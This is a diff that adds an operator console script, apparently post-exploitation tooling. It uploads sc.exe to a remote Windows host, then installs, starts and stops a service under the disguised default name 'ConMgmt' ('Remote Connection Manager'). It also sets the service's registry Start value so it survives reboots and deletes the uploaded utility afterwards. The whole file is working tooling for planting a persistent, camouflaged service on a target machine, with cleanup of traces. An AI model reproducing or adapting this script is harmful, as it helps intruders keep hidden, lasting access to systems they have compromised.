@@ -1,0 +1,192 @@
+#--------------------------------------------------------
+# File: Services.eps
+#
+# Wrapper script for Services tools
+#
+# Modifications:
+#  11/26/2002	Created.
+#--------------------------------------------------------
+
+@echo off;
+
+bool $bUploadedSC = false;
+
+# check to see if sc.exe is already loaded
+if(`dir sc.exe`) {
+    echo "sc.exe already installed (file exists)";
+    $bUploadedSC = false;
+} else {
+    if (prompt "Upload 'sc' utility?") {
+	# get resource directory
+	@record on;
+	ifnot (`getdirectory -scripts`) {
+		echo "* Unable to get scripts directory";
+		return false;
+	}
+	string $ScriptsDir = GetCmdData("dir");
+	ifnot (defined($ScriptsDir[0])) {
+		echo "* Unable to retrieve scripts directory";
+		return false;
+	}
+	@record off;
+
+	string $uploadsPath = "$ScriptsDir\\..\\..\\tools";
+	# put the sc.exe
+	echo "Uploading the $uploadsPath\\sc.exe";
+	if (`put "$uploadsPath\\sc.exe" -name "sc.exe" -permanent`) {
+		echo "    SUCCESS";
+		$bUploadedSC = true;
+	} else {
+		echo "    FAILED";
+		return false;
+	}
+    }
+}
+
+# defaults
+string $serviceName = "ConMgmt";
+string $serviceDescrip = "Remote Connection Manager";
+string $sourceExe   = "ConMgmt.exe";
+
+# commands
+int $installCmdsStart = 1;
+string $commands;
+$commands[0] = "Quit";
+
+# start of "install" commands
+$commands[1] = "Change service name";
+$commands[2] = "Change source exe";
+$commands[3] = "Install service";
+$commands[4] = "Uninstall serice";
+$commands[5] = "Start service";
+$commands[6] = "Stop service";
+$commands[7] = "Verify install";
+$commands[8] = "Verify service is running";
+$commands[9] = "Reset start to persist on reboot";
+$commands[10] = "Check reset count";
+
+while (true) {
+    echo "\r\n\r\n";
+
+    # Print the current configuration
+    echo "Current Configuration:";
+    echo "\tService name    : $serviceName";
+    echo "\tService Descrip : $serviceDescrip";
+    echo "\tSource exe      : $sourceExe";
+   echo "";
+
+    # print the command list
+    int $i=0;
+    while ($i < sizeof($commands)) {
+	if ($i == $installCmdsStart) {
+	    echo "";
+	    echo "Installation commands:";
+	}
+	echo "($i). $commands[$i]";
+	$i++;
+    }
+
+    echo "";
+    int $choice = GetInput("Enter the desired option");
+    if ($choice == 0) {
+	# quit
+	# if we uploaded sc.exe then delete it
+	if ($bUploadedSC){
+		# del the sc.exe
+		echo "deleting  sc.exe";
+		if (`del "sc.exe"`) {
+			echo "    SUCCESS";
+		} else {
+			echo "    FAILED";
+			return false;
+		}
+	}
+	return true;
+    } else if ($choice == 1) {
+	# Change service name
+	echo "Current service name = '$serviceName'";
+	echo "Current service description = '$serviceDescrip'";
+	$serviceName = GetInput("Enter new service name");
+	$serviceDescrip = GetInput("Enter new service description");
+    } else if ($choice == 2) {
+	# Change service name
+	echo "Current source exe = '$sourceExe'";
+	$sourceExe = GetInput("Enter new source exe");
+   } else if ($choice == 3) {
+	# install service
+	if (`script Services\\Install.eps $serviceName "$serviceDescrip" $sourceExe`) {
+		echo "INSTALL SUCCESS";
+		echo "";
+		echo "NOTE: The service has not been loaded";
+	} else {
+		echo "**** INSTALL FAILED ****";
+	}
+	} else if ($choice == 4) {
+	# uinstall service
+	if (`script Services\\Uninstall.eps $serviceName`) {
+		echo "UNINSTALL SUCCESS";
+	} else {
+		echo "**** UNINSTALL FAILED ****";
+	}
+	} else if ($choice == 5) {
+	# load the service
+	if (prompt "Start the service ($serviceName)?") {
+		echo "Starting Service";
+		@echo on;
+		if (`run -command "sc start $serviceName" -redirect start`){
+			echo "    Start $serviceName SUCCESS";
+		} else {
+			echo "    Start $serviceName FAILED";
+		}
+		@echo off;
+	}
+    } else if ($choice == 6) {
+	# unload the service
+	if (prompt "Stop the service ($serviceName)?") {
+		echo "Stopping Service";
+		@echo on;
+		if (`run -command "sc stop $serviceName" -redirect stop`){
+			echo "    Stop $serviceName SUCCESS";
+		} else {
+			echo "    Stop $serviceName FAILED";
+		}
+		@echo off;
+	}
+    } else if ($choice == 7) {
+	# verify install
+	if (`script Services\\VerifyInstall.eps $serviceName "$serviceDescrip"`) {
+	    echo "VERIFICATION SUCCESSFULL";
+	} else {
+	    echo "**** UNABLE TO VERIFY INSTALL ****";
+	}
+    } else if ($choice == 8) {
+	# verify install
+	if (`script Services\\VerifyRunning.eps $serviceName`) {
+	    echo "VERIFICATION SUCCESSFULL";
+	} else {
+	    echo "**** UNABLE TO VERIFY service IS RUNNING ****";
+	}
+   } else if ($choice == 9) {
+	# reset start value to 2 (only necessary to fix older installs that used 3)
+	if (prompt "Reset start value to indicate start on reboot?") {
+	    echo "Setting start value";
+	    if (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$serviceName -value Start -type REG_DWORD -data 2`) {
+		echo "    CHANGED";
+	    } else {
+		echo "    FAILED";
+	    }
+	}
+   } else if ($choice == 10) {
+	# check the reset count
+	@echo on;
+	`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$serviceName -value Tag`;
+	@echo off;
+   } else {
+	# invalid choice
+	echo "*** Invalid choice ***";
+    }
+
+    pause;
+}
+
+return true;
